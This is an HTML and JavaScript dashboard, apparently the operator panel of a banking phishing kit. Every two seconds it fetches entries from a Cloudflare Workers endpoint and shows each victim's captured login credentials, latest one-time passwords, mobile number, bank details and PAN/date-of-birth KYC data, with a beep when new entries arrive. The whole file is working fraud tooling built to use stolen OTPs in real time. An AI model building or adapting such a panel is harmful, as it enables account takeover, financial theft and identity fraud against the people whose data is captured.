<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Data Terminal</title>
    <style>
        body { 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            margin: 0; 
            padding: 15px; 
        }
        .header { 
            border-bottom: 2px solid #0f0; 
            padding-bottom: 10px; 
            margin-bottom: 20px; 
            display: flex; 
            justify-content: space-between; 
            font-weight: bold;
        }
        .card { 
            border: 1px solid #0f0; 
            background: #0a0a0a; 
            padding: 15px; 
            margin-bottom: 15px; 
            border-radius: 5px; 
            position: relative;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }
        .time { color: #ffff00; font-size: 0.8em; float: right; }
        .data-row { margin: 10px 0; }
        .label { color: #888; font-size: 0.75em; text-transform: uppercase; }
        .value { 
            display: block; 
            font-size: 1.2em; 
            white-space: pre-wrap; 
            color: #0f0; 
            margin-top: 5px; 
        }
        .otp-highlight { 
            background: #e60000; 
            color: #fff; 
            padding: 4px 8px; 
            font-weight: bold; 
            border-radius: 3px;
        }
        .blink { animation: blinker 1s linear infinite; color: red; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

<div class="header">
    <div>SYSTEM STATUS: ONLINE <span class="blink">●</span></div>
    <div id="user-count">Users: 0</div>
</div>

<div id="logs-container">
    <div style="text-align: center;">Fetching data from Worker...</div>
</div>

<audio id="beep" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<script>
    const API_URL = 'https://restless-dew-2156.sumankkuuyy.workers.dev/';
    let lastDataStr = "";

    async function updateTerminal() {
        try {
            const res = await fetch(API_URL);
            const data = await res.json();
            
            const currentStr = JSON.stringify(data);
            if (currentStr !== lastDataStr) {
                if (lastDataStr !== "") document.getElementById('beep').play();
                lastDataStr = currentStr;
                render(data);
            }
        } catch (err) {
            console.log("Error:", err);
        }
    }

    function render(logs) {
        const container = document.getElementById('logs-container');
        document.getElementById('user-count').innerText = `Users: ${logs.length}`;
        container.innerHTML = '';

        logs.forEach(user => {
            const card = document.createElement('div');
            card.className = 'card';

            let html = `<div class="time">${new Date(user.time).toLocaleTimeString()}</div>`;

            // Agar koi bhi OTP hai toh sabse upar dikhao
            let latestOtp = user.otp_3 || user.otp_2 || user.otp_1;
            if (latestOtp) {
                html += `<div class="data-row"><span class="label">LATEST OTP</span><br><span class="otp-highlight">${latestOtp}</span></div>`;
            }

            // User ID & Pass Format (Aman wala style)
            if (user.credentials) {
                html += `<div class="data-row"><span class="value">${user.credentials}</span></div>`;
            }

            // Mobile Number
            if (user.mobile) {
                html += `<div class="data-row"><span class="label">Mobile:</span><span class="value">${user.mobile}</span></div>`;
            }

            // Baki details
            if (user.bank_details) html += `<div class="data-row"><span class="label">Bank Info:</span><span class="value">${user.bank_details}</span></div>`;
            if (user.kyc_data) html += `<div class="data-row"><span class="label">KYC (PAN/DOB):</span><span class="value">${user.kyc_data}</span></div>`;

            card.innerHTML = html;
            container.appendChild(card);
        });
    }

    // Har 2 second mein refresh karega
    setInterval(updateTerminal, 2000);
    updateTerminal();
</script>

</body>
</html>
